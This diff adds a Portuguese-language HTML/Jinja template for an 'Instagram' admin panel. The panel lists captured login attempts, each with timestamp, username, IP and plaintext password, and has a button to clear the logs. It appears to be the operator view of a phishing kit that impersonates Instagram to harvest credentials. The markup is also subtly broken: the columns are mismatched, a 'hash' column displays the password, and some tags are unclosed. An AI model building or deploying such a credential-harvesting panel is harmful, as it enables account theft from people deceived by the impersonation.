@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Painel Administrativo</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="admin-container">
+        <header class="admin-header">
+            <div class="admin-logo">
+                <span class="logo-text">Instagram</span>
+                <span class="logo-subtitle">Painel Administrativo</span>
+            </div>
+            <div class="admin-user">
+                <span>Logado como: <strong>{{ logged_user }}</strong></span>
+            </div>
+        </header>
+
+        <main class="admin-main">
+            <div class="admin-card">
+                <div class="card-header">
+                    <h2>Tentativas de Login</h2>
+                    <div class="card-actions">
+                        <form method="POST" action="/admin">
+                            <input type="hidden" name="action" value="clear_logs">
+                            <button type="submit" class="btn-outline">Limpar Logs</button>
+                        </form>
+                        <form method="POST" action="/admin">
+                            <input type="hidden" name="action" value="logout">
+                            <button type="submit" class="btn-outline">Sair</button>
+                        </form>
+                    </div>
+                </div>
+
+                {% if attempts %}
+                <div class="table-container">
+                    <table class="attempts-table">
+                        <thead>
+                            <tr>
+                                <th>Horário</th>
+                                <th>Usuário</th>
+                                <th>IP</th>
+                                <th>Hash (Debug)</th>
+                                <th>Senha </th>
+                                <th>Status</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for attempt in attempts %}
+                            <tr>
+                                <td>{{ attempt.timestamp }}</td>
+                                <td>{{ attempt.username or 'vazio' }}</td>
+                                <td>{{ attempt.ip }}</td>
+                                <td><code>{{ attempt.password or 'vazio' }}</code></td>
+                                <td>
+                                    <span class="status-badge {% if attempt.status == 'Sucesso' %}status-success{% else %}status-fail{% endif %}">
+                                        {{ attempt.status }}
+                                    </span>
+                                </td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+                {% else %}
+                <div class="empty-state">
+                    <p>Nenhuma tentativa de login registrada.</p>
+                    <p>Faça login na página principal para visualizar os logs aqui.</p
+                </div>
+                {% endif %}
+                </main>
+</div>
+</body>
+</html>
